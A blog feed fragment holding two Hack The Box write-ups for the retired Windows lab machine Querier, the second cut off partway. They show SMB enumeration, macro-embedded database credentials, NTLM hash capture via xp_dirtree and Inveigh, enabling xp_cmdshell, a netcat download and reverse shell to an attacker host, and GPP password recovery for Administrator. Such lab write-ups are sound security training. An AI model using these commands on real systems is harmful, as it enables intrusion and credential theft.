/><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier-2</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier-2/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-this-is-the-second-post-for-querier-you-can-read-the-first-post-here-in-the-first-post-i-solved-it-with-kali-in-this-post-i-will-solve-it-with-commando-vm-queriers-ip-is-101010125-i-added-it-to-cwindowssystem32driversetchosts-as-querierhtb-lets-jump-right-in-&quot;&gt;Hey guys this is the second post for Querier, you can read the first post &lt;a href=&quot;/hack-the-box/querier&quot;&gt;here&lt;/a&gt;. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-we-dont-have-credentials-for-mssql-so-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. We don’t have credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; so let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-list-the-shares-we-can-do-that-using-net-view-&quot;&gt;We need to list the shares, We can do that using &lt;code class=&quot;highlighter-rouge&quot;&gt;net view&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net view querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-only-showed-us-reports-because-its-the-only-share-that-we-can-access-anonymously-which-is-nice&quot;&gt;It only showed us &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt; because it’s the only share that we can access anonymously which is nice.&lt;/h4&gt;
&lt;h4 id=&quot;we-can-mount-the-share-from-cmd-with-net-use-&quot;&gt;We can mount the share from &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;net use&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net use Z: \\querier.htb\Reports /persistent:yes&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-also-do-it-from-the-file-explorer-&quot;&gt;We can also do it from the file explorer :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
&lt;h4 id=&quot;i-used-olevba-to-get-credentials-from-the-excel-file-like-i-did-in-the-first-post-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; to get credentials from the excel file like I did in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-connect-to-the-mssql-server-i-will-use-heidisql-&quot;&gt;To connect to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server I will use &lt;a href=&quot;https://www.heidisql.com/&quot;&gt;HeidiSQL&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-authentication-failed-&quot;&gt;However, authentication failed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-windows-authentication-&quot;&gt;I tried windows authentication :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-it-also-failed-because-it-was-trying-as-guest-not-reporting-&quot;&gt;But it also failed because it was trying as guest not reporting :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-solve-this-we-can-use-runas-to-run-heidi-as-reporting-&quot;&gt;To solve this we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; as reporting :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\reporting cmd.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-the-new-cmd-session-i-ran-heidi-&quot;&gt;From the new &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; session I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-windows-authentication-worked-&quot;&gt;Now windows authentication worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;got-permission-denied-for-xp_cmdshell-&quot;&gt;Got permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-run-a-fake-smb-server-to-capture-credentials-using-a-tool-called-inveigh-which-works-like-responder-from-powershell-i-imported-inveigh-import-module-ctoolsinveighinveighps1-then-i-disabled-the-firewall-netsh-advfirewall-set-allprofiles-state-off-and-invoked-inveigh-invoke-inveigh--ip-1010xxxx--consoleoutput-y&quot;&gt;We can run a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; server to capture credentials using a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; which works like responder. From &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt; I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Import-Module C:\Tools\Inveigh\Inveigh.ps1&lt;/code&gt;). Then I disabled the firewall (&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh advfirewall set allprofiles state off&lt;/code&gt;) and invoked &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y&lt;/code&gt;).&lt;/h4&gt;
&lt;h4 id=&quot;from-heidi-i-used-xp_dirtree-&quot;&gt;From &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; I used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;inveigh-captured-the-ntlmv2-hash-for-mssql-svc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; captured the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-cracking-the-hash-on-another-box-the-password-is-corporate568-now-we-can-use-runas-to-run-heidi-as-mssql-svc-&quot;&gt;After cracking the hash on another box the password is &lt;code class=&quot;highlighter-rouge&quot;&gt;corporate568&lt;/code&gt;. Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;queries-to-enable-xp_cmdshell-&quot;&gt;Queries to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-we-got-rce-i-ran-a-python-server-to-host-ncexe-then-i-downloaded-it-on-the-box-and-got-a-reverse-shell-&quot;&gt;Great, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I downloaded it on the box and got a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe';
EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;as-i-said-in-the-first-post-when-i-checked-group-policy-passwords-i-found-administrators-password-there-are-privilege-escalation-enumeration-scripts-for-windows-like-linenumsh-for-linux-one-of-them-is-powerupps1-and-it-checks-for-group-policy-passwords-lets-check-that-one-&quot;&gt;As I said in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt;, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; for Linux one of them is &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powerup.ps1&lt;/code&gt;&lt;/a&gt; and it checks for group policy passwords. Let’s check that one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/23.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-also-decrypts-the-password-which-is-nice-password--myunclesaremarioandluigi1&quot;&gt;It also decrypts the password which is nice. Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-can-use-psexec-to-get-a-shell-as-administrator-i-used-runas-to-start-cmd-as-querieradministrator-then-i-used-psexec-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; to get a shell as Administrator. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to start &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;QUERIER\Administrator&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\Administrator cmd.exe&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec \\querier.htb cmd&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;first-write-up--hack-the-box---querier&quot;&gt;First write-up : &lt;a href=&quot;/hack-the-box/querier&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\Windows\System32\drivers\etc\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\querier.htb\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\Tools\Inveigh\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare' Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe'; EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337' We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\Administrator then I used psexec : runas /netonly /user:QUERIER\Administrator cmd.exe psexec \\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab Next Hack The Box write-up : Hack The Box - Netmon</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier-2/0.png" /></entry><entry><title type="html">Hack The Box - Querier</title><link href="http://localhost:4000/hack-the-box/querier/" rel="alternate" type="text/html" title="Hack The Box - Querier" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-querier-retired-and-heres-my-write-up-about-it-it-was-a-great-windows-machine-covering-some-interesting-stuff-and-i-enjoyed-iti-wrote-two-posts-for-this-machine-first-one-solving-it-with-kali-and-the-other-one-solving-it-with-commando-vm-you-can-find-the-second-post-here-its-a-windows-box-and-its-ip-is-101010125-i-added-it-to-etchosts-as-querierhtb-lets-jump-right-in&quot;&gt;Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post &lt;a href=&quot;/hack-the-box/querier-2/&quot;&gt;here&lt;/a&gt;. It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in!&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-list-the-shares-first-i-used-smbclient-&quot;&gt;We need to list the shares first. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient --list //querier.htb/ -U &quot;&quot;
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to querier.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;obviously-if-theres-an-anonymously-accessible-share-it-will-be-reports-lets-see-whats-in-there-&quot;&gt;Obviously if there’s an anonymously accessible share it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt;, Let’s see what’s in there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# smbclient //querier.htb/Reports/ -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                6469119 blocks of size 4096. 1608855 blocks available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;only-an-excel-file&quot;&gt;Only an Excel file.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: \&amp;gt; get &quot;Currency Volume Report.xlsm&quot;
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (17.1 KiloBytes/sec) (average 17.1 KiloBytes/sec)
smb: \&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# file Currency\ Volume\ Report.xlsm 
Currency Volume Report.xlsm: Microsoft Excel 2007+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql-credentials-from-reportxlsm&quot;&gt;MSSQL Credentials from Report.xlsm&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-the-contents-of-the-excel-file-by-just-viewing-it-as-it-will-be-opened-with-the-archive-manager-&quot;&gt;I checked the contents of the excel file by just viewing it as it will be opened with the archive manager :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-xl-i-found-vbaprojectbin-so-i-used-olevba-from-oletools-to-see-if-i-can-get-anything-&quot;&gt;in &lt;code class=&quot;highlighter-rouge&quot;&gt;xl&lt;/code&gt; I found &lt;code class=&quot;highlighter-rouge&quot;&gt;vbaProject.bin&lt;/code&gt; so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; from &lt;a href=&quot;https://www.decalage.info/python/oletools&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;oletools&lt;/code&gt;&lt;/a&gt; to see if I can get anything :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# olevba Currency\ Volume\ Report.xlsm 
olevba 0.54.2 on Python 2.7.16 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox &quot;connection successful&quot;
 
  'Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)
  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)
  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-we-got-connection-credentials-for-the-mssql-server-&quot;&gt;Great, we got connection credentials for the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
